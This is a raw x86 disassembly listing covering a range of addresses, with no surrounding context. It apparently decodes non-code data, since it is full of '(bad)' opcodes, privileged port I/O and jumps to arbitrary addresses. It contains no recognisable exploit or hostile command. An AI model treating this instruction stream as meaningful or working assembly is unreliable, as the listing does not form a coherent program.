  42eeda:	sbb    al,0xfe
  42eedc:	inc    DWORD PTR [ecx+ebp*8+0x4a]
  42eee0:	in     eax,dx
  42eee1:	cld    
  42eee2:	stc    
  42eee3:	mov    eax,ds:0x24d98684
  42eee8:	mov    cl,BYTE PTR [ecx]
  42eeea:	ins    DWORD PTR es:[edi],dx
  42eeeb:	cmp    DWORD PTR [ecx+edi*8+0x251017e9],eax
  42eef2:	aad    0x8a
  42eef4:	dec    edx
  42eef5:	mov    edi,0x43081f02
  42eefa:	xor    DWORD PTR [edx-0x48],esi
  42eefd:	jge    0x42eeab
  42eeff:	or     bh,BYTE PTR [ebx+0x31]
  42ef02:	rol    BYTE PTR [eax],1
  42ef04:	fdivr  DWORD PTR [eax+ecx*1+0x90e61e9]
  42ef0b:	shr    al,0xaf
  42ef0e:	or     cl,ch
  42ef10:	popa   
  42ef11:	or     eax,0xc39eb9fe
  42ef16:	sub    eax,0x9abc5a9
  42ef1b:	lods   al,BYTE PTR ds:[esi]
  42ef1c:	mov    al,ds:0x61e9b871
  42ef21:	fstp   DWORD PTR [edi+0x1180855]
  42ef27:	mov    eax,fs:0xfc000d08
  42ef2d:	lock leave 
  42ef2f:	pop    ecx
  42ef30:	xchg   ecx,eax
  42ef31:	dec    esp
  42ef32:	sbb    eax,0xe320801c
  42ef37:	add    edi,DWORD PTR [eax-0x35]
  42ef3a:	test   dh,0xcf
  42ef3d:	jecxz  0x42ef5b
  42ef3f:	add    DWORD PTR [eax-0x26],edx
  42ef42:	sub    edi,0x1c1d9c83
  42ef48:	add    DWORD PTR [edx-0x3],0x32
  42ef4c:	xchg   edx,eax
  42ef4d:	xchg   edi,eax
  42ef4e:	mov    BYTE PTR [esi],bh
  42ef50:	jae    0x42ef87
  42ef52:	sub    eax,DWORD PTR [eax]
  42ef54:	mov    ebx,0xbf74ba02
  42ef59:	call   DWORD PTR [ecx]
  42ef5b:	jmp    0x42ef26
  42ef5d:	(bad)  
  42ef5e:	mov    edx,0x8e53d89
  42ef63:	add    BYTE PTR [ebx+0xfffc56],bh
  42ef69:	psrad  mm4,QWORD PTR [edx+0x14]
  42ef6d:	js     0x42ef6b
  42ef6f:	xor    al,0x48
  42ef71:	push   esp
  42ef72:	cdq    
  42ef73:	stc    
  42ef74:	(bad)  
  42ef75:	scas   al,BYTE PTR es:[edi]
  42ef76:	sti    
  42ef77:	or     DWORD PTR [eax+0x7b],eax
  42ef7a:	pop    eax
  42ef7b:	mov    ecx,0x41ff6174
  42ef80:	add    al,0x99
  42ef82:	dec    ebx
  42ef83:	sbb    eax,0x195021c
  42ef88:	sbb    dl,0xdd
  42ef8b:	xor    BYTE PTR [eax+0x4f],cl
  42ef8e:	push   es
  42ef8f:	push   edx
  42ef90:	or     al,0xd3
  42ef92:	xchg   ebp,eax
  42ef93:	or     DWORD PTR [ecx-0x742dffdd],ecx
  42ef99:	addr16 mov ecx,0xd58a8310
  42ef9f:	xchg   DWORD PTR [esi-0x67a99],ebx
  42efa5:	(bad)  
  42efa6:	test   DWORD PTR [ebx],0xd412552
  42efac:	jg     0x42efc8
  42efae:	sbb    al,0xf0
  42efb0:	xor    ebp,ecx
  42efb2:	repnz sbb al,0x8
  42efb5:	bound  esi,QWORD PTR [eax+0x55]
  42efb8:	ins    BYTE PTR es:[edi],dx
  42efb9:	push   eax
  42efba:	jo     0x42efb9
  42efbc:	xchg   BYTE PTR [esp+ebp*4-0x20a000b],bh
  42efc3:	popa   
  42efc4:	jae    0x42f022
  42efc6:	div    DWORD PTR [ecx]
  42efc8:	out    0xc8,eax
  42efca:	jg     0x42efc9
  42efcc:	inc    DWORD PTR [eax]
  42efce:	jmp    0x90974c9e
  42efd3:	jo     0x42efd2
  42efd5:	xchg   BYTE PTR [eax+ebx*8+0x70622db2],bl
  42efdc:	rcr    BYTE PTR cs:0x1b56c81a,0x2e
  42efe4:	icebp  
  42efe5:	(bad)  
  42efe6:	fdiv   DWORD PTR [edx]
  42efe8:	push   esi
  42efe9:	repz jno 0x42f02a
  42efec:	sub    al,0x51
  42efee:	inc    edx
  42efef:	ret    0x86c2
  42eff2:	and    esp,DWORD PTR [esi+ecx*8-0x72bd17b]
  42eff9:	push   edx
  42effa:	fnstenv [eax+eiz*1+0x2e07140c]
  42f001:	test   DWORD PTR [esp+ebp*8-0x5],ebp
  42f005:	cmp    BYTE PTR [eiz*8+0x7c0437ff],ch
  42f00c:	jmp    0x3e329017
  42f011:	add    ebx,DWORD PTR [ecx+0x3a6e24e1]
  42f017:	push   edi
  42f018:	cs jg  0x42f03e
  42f01b:	test   al,0xcf
  42f01d:	xchg   BYTE PTR [ebx-0x27],ah
  42f020:	(bad)  
  42f022:	popa   
  42f023:	dec    esi
  42f024:	imul   ebx,DWORD PTR [ebx],0x5be7d95a
  42f02a:	es enter 0x3e7,0xe5
  42f02f:	inc    edx
  42f030:	adc    edi,esp
  42f032:	add    BYTE PTR ds:0x91666482,dl
  42f038:	rcr    DWORD PTR [esi+0x36],cl
  42f03b:	std    
  42f03c:	scas   al,BYTE PTR es:[edi]
  42f03d:	(bad)  
  42f03e:	add    esp,DWORD PTR [edx+0x4e]
  42f041:	xor    bl,BYTE PTR [ebx-0x2]
  42f044:	(bad)  
  42f045:	out    0x3,eax
  42f047:	in     eax,0x92
  42f049:	inc    DWORD PTR [edx+esi*1-0x27]
  42f04d:	out    0xc5,eax
  42f04f:	cmp    BYTE PTR [esi],bl
  42f051:	es sti 
  42f053:	aad    0x2c
  42f055:	outs   dx,DWORD PTR ds:[esi]
  42f056:	push   edi
  42f057:	xor    ecx,DWORD PTR [esi+0x7c]
  42f05a:	test   DWORD PTR [ebx+eax*2-0x41],0xe781bdfb
  42f062:	out    dx,eax
  42f063:	adc    BYTE PTR [si+0xc],0xe5
  42f068:	sub    edi,eax
  42f06a:	fs cs in eax,dx
  42f06d:	mov    edi,0xc2832dac
  42f072:	jg     0x42f049
  42f074:	or     ebp,DWORD PTR [ecx+edi*2]
  42f077:	(bad)  [edi+ebx*8-0x5fa39dfd]
  42f07e:	lock cmp eax,0x620c2459
  42f084:	or     al,0xde
  42f086:	fs imul ah
  42f089:	xchg   edx,eax
  42f08a:	out    dx,eax
  42f08b:	push   ebp
  42f08c:	adc    BYTE PTR [esp+edi*8],0x45
  42f090:	(bad)  
  42f091:	aad    0x3
  42f093:	bound  ebx,QWORD PTR [edi+edi*2+0x65]
  42f097:	add    dh,dl
  42f099:	mov    esp,0x42cb1e00
  42f09e:	sub    al,0xe1
  42f0a0:	popa   
  42f0a1:	fld    DWORD PTR [ebx-0x7a2ccd9a]
  42f0a7:	mov    es,WORD PTR cs:[ebx+0xe]
  42f0ab:	jmp    0x420c4911
  42f0b0:	or     dl,cl
  42f0b2:	add    cl,ch
  42f0b4:	loop   0x42f0f0
  42f0b6:	sub    al,0xf1
  42f0b8:	popa   
  42f0b9:	fld    DWORD PTR [eax]
  42f0bb:	xchg   esi,eax
  42f0bc:	stos   BYTE PTR es:[edi],al
  42f0bd:	fadd   QWORD PTR [ebx+0x2e7f0d29]
  42f0c3:	sub    DWORD PTR [esi+ebx*1],ebx
  42f0c6:	mov    edi,0x542a61f5
  42f0cb:	bound  ecx,QWORD PTR [ecx-0x459fabd5]
  42f0d1:	mov    esp,0xd65060c
  42f0d6:	pop    gs
  42f0d8:	popa   
  42f0d9:	idiv   edi
  42f0db:	cmc    
  42f0dc:	mov    ch,0xbc
  42f0de:	sbb    al,0x62
  42f0e0:	jne    0x42f065
  42f0e2:	je     0x42f0f1
  42f0e4:	push   0x71
  42f0e6:	xchg   ebp,eax
  42f0e7:	fadd   QWORD PTR [esi-0x7d]
  42f0ea:	test   ecx,edx
  42f0ec:	and    al,0x83
  42f0ee:	or     DWORD PTR [ebp-0x39],esp
  42f0f1:	cmp    cl,0xe9
  42f0f4:	loope  0x42f0fa
  42f0f6:	and    eax,0x531061d9
  42f0fb:	cmp    eax,0x994d8c00
  42f100:	fnstsw WORD PTR [ebp-0x80]
  42f103:	stc    
  42f104:	je     0x42f0cc
  42f106:	aam    0x8
  42f108:	jmp    0x644a696e
  42f10d:	sahf   
  42f10e:	aad    0x8b
  42f110:	push   esi
  42f111:	pop    ecx
  42f112:	fadd   QWORD PTR [eax]
  42f114:	add    BYTE PTR [ebx+0x1],cl
  42f117:	dec    esi
  42f118:	and    al,0x33
  42f11a:	dec    ebx
  42f11c:	movzx  ebp,WORD PTR [ecx+edi*8-0x1]
  42f121:	dec    ebx
  42f122:	add    DWORD PTR [esi+0x24],esp
  42f125:	xchg   BYTE PTR [bp+0x2c2],ch
  42f12a:	fdiv   st(2),st
  42f12c:	(bad)  
  42f12d:	cmp    esi,DWORD PTR [ecx-0x3c36f031]
  42f133:	add    BYTE PTR [esi],0xc
  42f136:	sub    eax,0x323a03c8
  42f13b:	stc    
  42f13c:	add    edi,ebx
  42f13e:	fild   DWORD PTR [edi+0x31b5674c]
  42f144:	ret    0xccd5
  42f147:	and    edx,eax
  42f149:	adc    bh,BYTE PTR [esi-0xa]
  42f14c:	ss clc 
  42f14e:	sbb    BYTE PTR [edx+0x53],cl
  42f151:	ins    BYTE PTR es:[edi],dx
  42f152:	iret   
  42f153:	pop    esp
  42f154:	push   ss
  42f155:	or     ebx,esp
  42f157:	or     DWORD PTR [edi+eiz*4-0x19],0xbfc479
  42f15f:	add    BYTE PTR [ecx+0x0],dl
  42f162:	enter  0x5518,0x50
  42f166:	mov    esp,0x7b165581
  42f16b:	aad    0x81
  42f16d:	inc    esp
  42f16e:	push   edi
  42f16f:	leave  
  42f170:	inc    DWORD PTR ds:0x6a061108
  42f176:	mov    edi,edx
  42f178:	das    
  42f179:	push   ebx
  42f17a:	je     0x42f178
  42f17c:	ins    DWORD PTR es:[edi],dx
  42f17d:	and    al,0x63
  42f17f:	in     eax,dx
  42f180:	aam    0xfe
  42f182:	int3   
  42f183:	sti    
  42f184:	test   al,al
  42f186:	push   edi
  42f187:	xchg   BYTE PTR [eax],ch
  42f189:	push   es
  42f18a:	int3   
  42f18b:	loop   0x42f186
  42f18d:	ret    0xc262
  42f190:	mov    cl,0xfa
  42f192:	ja     0x42f140
  42f194:	idiv   BYTE PTR [edi]
  42f196:	(bad)  
  42f198:	dec    eax
  42f199:	or     ebx,ecx
  42f19b:	in     al,0x28
  42f19d:	sub    BYTE PTR [ecx-0x2c],ah
  42f1a0:	sub    BYTE PTR [eax],ah
  42f1a2:	mov    esp,esp
  42f1a4:	sub    BYTE PTR [eax],ah
  42f1a6:	jmp    0x42f1e4
  42f1a8:	and    DWORD PTR [eax],ebp
  42f1aa:	pop    ebp
  42f1ab:	cmc    
  42f1ac:	fdiv   st(2),st
  42f1ae:	and    eax,0x466b8a28
  42f1b3:	cmp    BYTE PTR [edi-0x7e850aa],0x3f
  42f1ba:	jo     0x42f1ec
  42f1bc:	std    
  42f1bd:	pop    edx
  42f1be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1bf:	imul   eax,DWORD PTR [ebx+0x13],0xeb8a6562
  42f1c6:	add    cl,ah
  42f1c8:	xor    eax,0xb9400f5
  42f1cd:	push   esp
  42f1ce:	or     bl,bh
  42f1d0:	sbb    al,0x5
  42f1d2:	add    BYTE PTR [edx+0x47],ah
  42f1d5:	mov    bh,BYTE PTR [esi+ebp*2-0x13]
  42f1d9:	pop    ebp
  42f1da:	or     ah,dh
  42f1dc:	pop    ss
  42f1dd:	add    eax,0xc87e6200
  42f1e2:	pop    ds
  42f1e3:	pusha  
  42f1e4:	lahf   
  42f1e5:	mov    BYTE PTR [edx+eiz*2+0x2f7efd70],bl
  42f1ec:	cmp    ch,0x74
  42f1ef:	inc    ebp
  42f1f0:	sti    
  42f1f1:	enter  0xe71b,0x30
  42f1f5:	push   cs
  42f1f6:	test   dh,ah
  42f1f8:	jo     0x42f1f7
  42f1fa:	dec    DWORD PTR [ebp+0x5e725e80]
  42f200:	sbb    al,BYTE PTR ds:0x5e9bf7fb
  42f206:	je     0x42f272
  42f208:	(bad)  [edi-0x658194bc]
  42f20e:	outs   dx,BYTE PTR ds:[esi]
  42f20f:	in     eax,dx
  42f210:	pop    ecx
  42f211:	adc    al,0x2c
  42f213:	bound  eax,QWORD PTR [esi+edx*1]
  42f216:	arpl   WORD PTR [esi+0x15],bp
  42f219:	(bad)  
  42f21a:	ret    
  42f21b:	dec    ebp
  42f21c:	mov    ebp,0xd9620684
  42f221:	cld    
  42f222:	call   0x284f44d3
  42f227:	fbld   TBYTE PTR [ecx-0x53ff4025]
  42f22d:	add    bh,al
  42f22f:	add    ebp,DWORD PTR [esi+0x7662ba27]
  42f235:	or     eax,0xf015c3f6
  42f23a:	call   0xb4c2002c
  42f23f:	paddusw mm1,QWORD PTR [esi+0x7df9c83f]
  42f246:	sub    cl,BYTE PTR [eax-0x7c25fb4b]
  42f24c:	outs   dx,BYTE PTR ds:[esi]
  42f24d:	shl    edi,1
  42f24f:	xlat   BYTE PTR ds:[ebx]
  42f250:	pop    ebx
  42f251:	dec    esp
  42f252:	pop    edi
  42f253:	jmp    DWORD PTR [ebp-0x27]
  42f256:	out    0x90,eax
  42f258:	in     eax,0xe8
  42f25a:	out    dx,eax
  42f25b:	add    esp,DWORD PTR [edx+0x72]
  42f25e:	jmp    0x42f1f0
  42f260:	fucomp st(0)
  42f262:	fild   WORD PTR [ebx]
  42f264:	bound  ecx,QWORD PTR [edi+edx*2-0x1]
  42f268:	pop    ebp
  42f269:	(bad)  
  42f26b:	mov    ch,BYTE PTR [edx]
  42f26d:	aad    0xa2
  42f26f:	ret    
  42f270:	pop    ebp
  42f271:	fsub   st,st(7)
  42f273:	add    esp,DWORD PTR [edx+0x52]
  42f276:	es hlt 
  42f278:	jmp    0x66da:0x170600d7
  42f27f:	bound  esp,QWORD PTR es:[edi]
  42f282:	add    DWORD PTR [esi+0x290ebd75],esi
  42f288:	pop    esi
  42f289:	es pop edx
  42f28b:	inc    edi
  42f28c:	lods   eax,DWORD PTR ds:[esi]
  42f28d:	cmp    esp,DWORD PTR [ecx+ebp*8]
  42f290:	add    BYTE PTR [ebx+0x1b90862a],ch
  42f296:	adc    BYTE PTR [ebx],0x1d
  42f299:	dec    esp
  42f29a:	mov    ebp,0x80661300
  42f29f:	je     0x42f266
  42f2a1:	dec    ebp
  42f2a2:	push   esp
  42f2a3:	leave  
  42f2a4:	jbe    0x42f2c0
  42f2a6:	mov    ecx,0x83c18114
  42f2ab:	stc    
  42f2ac:	data16 fild QWORD PTR [ebx+eax*4+0x57]
  42f2b1:	or     al,bh
  42f2b3:	callw  0x3d39
  42f2b7:	or     al,0xe1
  42f2b9:	popa   
  42f2ba:	(bad)  [ebx+0xd57277]
  42f2c0:	jmp    0xe8aa1d95
  42f2c5:	mov    DWORD PTR [ebp-0x5],esp
  42f2c8:	cs xor esi,0xffffffff
  42f2cc:	and    eax,0xe904d4c8
  42f2d1:	popa   
  42f2d2:	dec    esi
  42f2d3:	inc    edx
  42f2d4:	in     al,dx
  42f2d5:	adc    DWORD PTR [ebx],ebp
  42f2d7:	addr16 jmp 0x73e4c26
  42f2dd:	inc    ebx
  42f2de:	jg     0x42f354
  42f2e0:	(bad)
  42f2e3:	leave  
  42f2e4:	not    BYTE PTR [ebp+0x640110b8]
  42f2ea:	jle    0x42f2e5
  42f2ec:	out    0xea,al
  42f2ee:	jg     0x42f303
  42f2f0:	sub    DWORD PTR [esp+edi*4-0x5fffca00],ebp
  42f2f7:	ds or  cl,ch
  42f2fa:	int3   
  42f2fb:	push   ebx
  42f2fc:	in     al,dx
  42f2fd:	add    BYTE PTR [ebp+0x42],ch
  42f300:	cmp    BYTE PTR [ebp+0x77],0x4d
  42f304:	lock test DWORD PTR [esp+eiz*4-0x7abb7c95],esi
  42f30c:	stc    
  42f30d:	jae    0x42f366
  42f30f:	inc    esi
  42f310:	sbb    BYTE PTR [ebp+0x6b],0x53
  42f314:	shl    BYTE PTR [eax+ebp*2+0x56],cl
  42f318:	jl     0x42f32e
  42f31a:	dec    ebx
  42f31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f31c:	pop    esp
  42f31d:	push   esi
  42f31e:	in     al,0x82
  42f320:	inc    ebp
  42f321:	adc    bh,BYTE PTR [ebx-0x2b]
  42f324:	bound  eax,QWORD PTR [eax]
  42f326:	popa   
  42f327:	aad    0xf5
  42f329:	jne    0x42f36e
  42f32b:	dec    ebp
  42f32c:	(bad)  
  42f32d:	call   0x3a1057
  42f332:	mov    al,0x10
  42f334:	test   ecx,ecx
  42f336:	aas    
  42f337:	fld    QWORD PTR [ecx-0x7fb4e4a9]
  42f33d:	adc    BYTE PTR [ebx],dl
  42f33f:	fadd   DWORD PTR [eax]
  42f341:	cmp    ebp,DWORD PTR [ebx]
  42f343:	mov    ds:0xcbcec5ff,eax
  42f348:	add    bl,ch
  42f34a:	adc    eax,0xf31c804b
  42f34f:	xlat   BYTE PTR ds:[ebx]
  42f350:	add    BYTE PTR [ebx],bh
  42f352:	jmp    0x42f2f6
  42f354:	pop    ss
  42f355:	(bad)  
  42f356:	push   cs
  42f357:	int3   
  42f358:	inc    DWORD PTR [edx-0xa285500]
  42f35e:	xor    edx,DWORD PTR [eax-0x68]
  42f361:	std    
  42f362:	mov    dh,BYTE PTR [ebp-0x7]
  42f365:	imul   eax,DWORD PTR [ecx+eiz*8],0xc375f5d7
  42f36c:	clc    
  42f36d:	je     0x42f37b
  42f36f:	xchg   ebx,eax
  42f370:	jne    0x42f36e
  42f372:	inc    DWORD PTR [edx+eax*2-0x4d9dea0a]
  42f379:	out    dx,al
  42f37a:	aas    
  42f37b:	(bad)  
  42f37c:	(bad)  
  42f37d:	mov    ecx,0xf4302f59
  42f382:	jmp    FWORD PTR [esi]
  42f384:	pop    es
  42f385:	jno    0x42f405
  42f387:	mov    fs,WORD PTR [ebp+0x4833e7b3]
  42f38d:	pop    ecx
  42f38e:	cli    
  42f38f:	loope  0x42f405
  42f391:	push   ebp
  42f392:	ins    DWORD PTR es:[edi],dx
  42f393:	push   ds
  42f394:	jb     0x42f393
  42f396:	je     0x42f334
  42f398:	mov    edi,0x479127e6
  42f39d:	lods   eax,DWORD PTR ds:[esi]
  42f39e:	cli    
  42f39f:	xchg   edi,eax
  42f3a0:	enter  0x43d9,0x62
  42f3a4:	sti    
  42f3a5:	idiv   ebx
  42f3a7:	push   edx
  42f3a8:	mov    al,0x4
  42f3aa:	xchg   DWORD PTR [edx],esi
  42f3ac:	not    BYTE PTR [edx+0x73]
  42f3af:	dec    ebx
  42f3b0:	cmp    cl,BYTE PTR [ecx+ebx*2+0x1fbb0946]
  42f3b7:	jmp    0x1188:0x9cc32142
  42f3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3bf:	add    BYTE PTR [edx+0x4a145a70],ah
  42f3c5:	sahf   
  42f3c6:	mov    ebp,0x866f08ff
  42f3cb:	out    dx,al
  42f3cc:	jmp    0x42f353
  42f3ce:	push   ebp
  42f3cf:	ins    DWORD PTR es:[edi],dx
  42f3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3d1:	jo     0x42f389
  42f3d3:	test   ah,ch
  42f3d5:	fs adc ch,al
  42f3d8:	sub    DWORD PTR [edx-0x4f2105a1],edi
  42f3de:	fsubr  DWORD PTR [ecx]
  42f3e0:	cmp    BYTE PTR [ecx+0x30fe4797],cl
  42f3e6:	std    
  42f3e7:	cs stos DWORD PTR es:[edi],eax
  42f3e9:	fcom   DWORD PTR [edi]
  42f3eb:	aam    0xb7
  42f3ed:	imul   eax,DWORD PTR [esi-0x26261811],0xffffffde
  42f3f4:	pop    ecx
  42f3f5:	jno    0x42f436
  42f3f7:	ss sahf 
  42f3f9:	jp     0x42f467
  42f3fb:	push   ebp
  42f3fc:	push   0x766aa765
  42f401:	jno    0x42f427
  42f403:	xchg   BYTE PTR ss:[edx+0x63],bh
  42f407:	inc    ebx
  42f408:	test   dh,0xbf
  42f40b:	ret    0x7c93
  42f40e:	stos   BYTE PTR es:[edi],al
  42f40f:	adc    DWORD PTR [edx-0x4abd4ee5],esp
  42f415:	fsub   DWORD PTR [ebx+0x43]
  42f418:	rol    DWORD PTR [esp+eiz*2-0x67bfbe48],1
  42f41f:	add    esp,DWORD PTR [edx-0x27]
  42f422:	(bad)  
  42f423:	fld    QWORD PTR [eax]
  42f425:	adc    eax,0xa6907a7c
  42f42a:	jne    0x42f443
  42f42c:	pop    edi
  42f42d:	dec    esi
  42f42e:	lods   eax,DWORD PTR ds:[esi]
  42f42f:	aad    0xc3
  42f431:	sub    eax,0x5fd72755
  42f436:	dec    esi
  42f437:	aaa    
  42f438:	nop
  42f439:	scas   al,BYTE PTR es:[edi]
  42f43a:	jne    0x42f47b
  42f43c:	pop    es
  42f43d:	(bad)  
  42f43e:	(bad)  
  42f440:	xchg   ebx,eax
  42f441:	bound  ebp,QWORD PTR [esi+0x31]
  42f444:	mov    eax,0x6f666cdc
  42f449:	pop    ecx
  42f44a:	and    ebx,DWORD PTR [ebx+0x304e078a]
  42f450:	imul   edi,DWORD PTR [ebx-0x80],0x22
  42f454:	pop    esi
  42f455:	fs mov esp,0xd921d11f
  42f45b:	out    0xd8,eax
  42f45d:	popa   
  42f45e:	(bad)  
  42f45f:	daa    
  42f460:	push   0x36
  42f462:	and    al,BYTE PTR [ebx]
  42f464:	clc    
  42f465:	xchg   ebp,eax
  42f466:	in     eax,0xa7
  42f468:	add    ebp,edi
  42f46a:	and    eax,DWORD PTR [ecx]
  42f46c:	or     eax,0xe90088d6
  42f471:	popa   
  42f472:	push   edx
  42f473:	clc    
  42f474:	shl    DWORD PTR [ecx+ebp*4-0x5],1
  42f478:	fsubp  st(5),st
  42f47a:	and    al,0xe5
  42f47c:	inc    ebx
  42f47d:	aaa    
  42f47e:	push   ebx
  42f47f:	leave  
  42f480:	rcl    DWORD PTR [ecx-0xd],0xf9
  42f484:	(bad)  
  42f485:	fnstsw WORD PTR [ecx]
  42f487:	je     0x42f46c
  42f489:	add    ah,ch
  42f48b:	adc    al,0xe5
  42f48d:	sbb    DWORD PTR [edi],edx
  42f48f:	in     eax,0x7c
  42f491:	fisub  DWORD PTR [ecx-0x5c37387]
  42f497:	repz stc 
  42f499:	jb     0x42f44a
  42f49b:	xor    BYTE PTR [ecx-0x7c8c48fe],0xa9
  42f4a2:	xor    eax,0x3be86635
  42f4a7:	ja     0x42f460
  42f4a9:	or     eax,0x6200b90a
  42f4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f4af:	or     dl,0x94
  42f4b2:	lea    esi,[ebx-0x7c]
  42f4b5:	sub    DWORD PTR [edi+0x4e],edx
  42f4b8:	sar    BYTE PTR [esi+0x41bda1df],0x63
  42f4bf:	jb     0x42f4ba
  42f4c1:	dec    esi
  42f4c2:	shl    DWORD PTR [eax+0x6e],0xad
  42f4c6:	popa   
  42f4c7:	cmp    BYTE PTR ds:0x3fb1b429,ch
  42f4cd:	loope  0x42f4de
  42f4cf:	call   0x60a8ad59
  42f4d4:	shr    BYTE PTR [edx+0x48],cl
  42f4d7:	fnstenv [esi+ebp*8-0x5f]
  42f4db:	idiv   DWORD PTR [esi+0x91a7aed]
  42f4e1:	fwait
  42f4e2:	xor    edx,DWORD PTR [edx]
  42f4e4:	call   0xf79dece9
  42f4e9:	push   DWORD PTR [eax]
  42f4eb:	mov    DWORD PTR ds:0xc9420008,ebx
  42f4f1:	jle    0x42f551
  42f4f3:	jns    0x42f4d6
  42f4f5:	add    BYTE PTR [esi+0x30],dl
  42f4f8:	or     ecx,DWORD PTR [edi-0x80]
  42f4fb:	cmp    eax,0x2f8b00c9
  42f500:	ror    DWORD PTR [esp+esi*2],0x80
  42f504:	popa   
  42f505:	aas    
  42f506:	add    al,0x10
  42f508:	outs   dx,BYTE PTR ds:[esi]
  42f509:	div    BYTE PTR [ebx+eiz*8]
  42f50c:	adc    eax,0x9e000c4c
  42f511:	std    
  42f512:	and    BYTE PTR [edi+0x55],0xf9
  42f516:	mov    ch,BYTE PTR ds:0x4a478be5
  42f51c:	sar    DWORD PTR [edi-0x37a0d48b],1
  42f522:	je     0x42f57b
  42f524:	popa   
  42f525:	aas    
  42f526:	add    al,0xce
  42f528:	loopne 0x42f4b2
  42f52a:	or     DWORD PTR [ebx],0x18
  42f52d:	jnp    0x42f567
  42f52f:	dec    ebx
  42f530:	(bad)  
  42f531:	inc    DWORD PTR [edx+0x7547dfe3]
  42f537:	xchg   BYTE PTR [ebx],ch
  42f539:	or     dh,0xb3
  42f53c:	sbb    bh,BYTE PTR [esi+edi*8-0x54]
  42f540:	xor    eax,0xdc07c257
  42f545:	dec    edi
  42f546:	push   ebx
  42f547:	out    0x2d,al
  42f549:	dec    esi
  42f54a:	push   0xe16f
  42f54f:	and    esp,esp
  42f551:	pop    eax
  42f552:	push   eax
  42f553:	add    BYTE PTR [edi+ecx*8],bh
  42f556:	dec    eax
  42f557:	jg     0x42f510
  42f559:	fild   DWORD PTR [ecx+0x1da852ea]
  42f55f:	sbb    al,0x62
  42f561:	xchg   ebx,eax
  42f562:	pop    esp
  42f563:	cli    
  42f564:	ja     0x42f54c
  42f566:	in     eax,dx
  42f567:	aas    
  42f568:	(bad)  
  42f569:	jmp    0x42f524
  42f56b:	and    eax,DWORD PTR [esi-0x537bb215]
  42f571:	jle    0x42f4f4
  42f573:	shl    DWORD PTR [edx-0x7e],0xfd
  42f577:	push   edx
  42f578:	or     al,0xb7
  42f57a:	jmp    0x3e73:0x55b33500
  42f581:	fidivr DWORD PTR ds:0xfd823a01
  42f587:	inc    DWORD PTR [ebp+0x220f9594]
  42f58d:	add    BYTE PTR [eax-0x5af99a41],0xff
  42f594:	ins    DWORD PTR es:[edi],dx
  42f595:	sub    DWORD PTR [esi+0x3cc0d51],0xd057b153
  42f59f:	and    ecx,DWORD PTR [edx+0x72b7ef4f]
  42f5a5:	rol    BYTE PTR [eax*4-0x7d868fde],0x62
  42f5ad:	cmp    ch,0x4e
  42f5b0:	xor    eax,0xa20f3596
  42f5b5:	adc    BYTE PTR [esi+0x71],0x0
  42f5b9:	pop    edx
  42f5ba:	jmp    0x42f5f1
  42f5bc:	cli    
  42f5bd:	ja     0x42f5bf
  42f5bf:	out    dx,eax
  42f5c0:	aas    
  42f5c1:	bound  ebp,QWORD PTR [ecx]
  42f5c3:	push   es
  42f5c4:	mov    bl,0x9c
  42f5c6:	xchg   esi,eax
  42f5c7:	mov    cl,bh
  42f5c9:	or     eax,0x6a518bbb
  42f5ce:	sub    ecx,ecx
  42f5d0:	or     ecx,esp
  42f5d2:	sbb    DWORD PTR [edx],eax
  42f5d4:	je     0x42f631
  42f5d6:	add    ebp,DWORD PTR [ebx+edx*1+0x6f]
  42f5da:	fprem  
  42f5dc:	in     eax,dx
  42f5dd:	jge    0x42f561
  42f5df:	out    dx,eax
  42f5e0:	mov    WORD PTR [ebx-0x47],ds
  42f5e3:	jge    0x42f5f0
  42f5e5:	fcomi  st,st(7)
  42f5e7:	ret    
  42f5e8:	mov    ebx,0x9a96043
  42f5ed:	imul   ebp,DWORD PTR [esi],0x466909a1
  42f5f3:	test   eax,0x254658ff
  42f5f8:	jge    0x42f61e
  42f5fa:	jnp    0x42f5e6
  42f5fc:	push   es
  42f5fd:	fcomp  QWORD PTR [eax+0x763206df]
  42f603:	cld    
  42f604:	xor    DWORD PTR [ebx+0x19],0xffffffe8
  42f608:	mov    esp,0x8cdc1fda
  42f60d:	sti    
  42f60e:	enter  0x6864,0xf1
  42f612:	fldenv [eax-0x30]
  42f615:	ins    DWORD PTR es:[edi],dx
  42f616:	ja     0x42f64b
  42f618:	and    BYTE PTR [edx+0x76],al
  42f61b:	sbb    esp,DWORD PTR [eax]
  42f61d:	add    BYTE PTR [edx-0x7ddfec8a],al
  42f623:	push   cs
  42f624:	cmp    bl,BYTE PTR [ebx-0x2f]
  42f627:	mov    ebp,0x356e5ac3
  42f62c:	xlat   BYTE PTR ds:[ebx]
  42f62d:	ret    
  42f62e:	cmp    eax,0x38807f63
  42f633:	in     eax,dx
  42f634:	jmp    0x42f5b6
  42f636:	ds in  al,dx
  42f638:	aad    0x8e
  42f63a:	sbb    eax,DWORD PTR [ecx-0x269dd816]
  42f640:	fs ds xchg ecx,eax
  42f643:	fidiv  WORD PTR [esi-0x86e89a6]
  42f649:	ret    
  42f64a:	add    eax,0x9bba2a63
  42f64f:	adc    al,0x9f
  42f651:	mov    esp,0xe900c8b7
  42f656:	fcomp  QWORD PTR [eax]
  42f658:	push   ebp
  42f659:	jmp    0xd961:0xe408b9a5
  42f660:	mov    al,ds:0xf9cdb0e9
  42f665:	popf   
  42f666:	ins    DWORD PTR es:[edi],dx
  42f667:	loope  0x42f6e6
  42f669:	sub    BYTE PTR [ecx],dl
  42f66b:	jae    0x42f6e1
  42f66d:	int    0x69
  42f66f:	or     DWORD PTR [ecx],0x83d96139
  42f675:	sub    DWORD PTR [ebp+0x34e8b0d9],ebx
  42f67b:	je     0x42f6ac
  42f67d:	test   eax,0x6800de24
  42f682:	add    BYTE PTR [edx],cl
  42f684:	(bad)  
  42f685:	or     cl,ch
  42f687:	popa   
  42f688:	xchg   BYTE PTR es:[ebp+0x42],ch
  42f68c:	mov    cl,0x8
  42f68e:	jmp    0x169602f4
  42f693:	out    0x68,eax
  42f695:	out    0x59,eax
  42f697:	data16 fld DWORD PTR [eax]
  42f69a:	mov    bh,0xa2
  42f69c:	mov    ecx,0xdc2de814
  42f6a1:	jge    0x42f6c0
  42f6a3:	adc    cl,0x0
  42f6a6:	out    0xcc,al
  42f6a8:	push   esi
  42f6a9:	add    cl,ch
  42f6ab:	popa   
  42f6ac:	addr16 inc esp
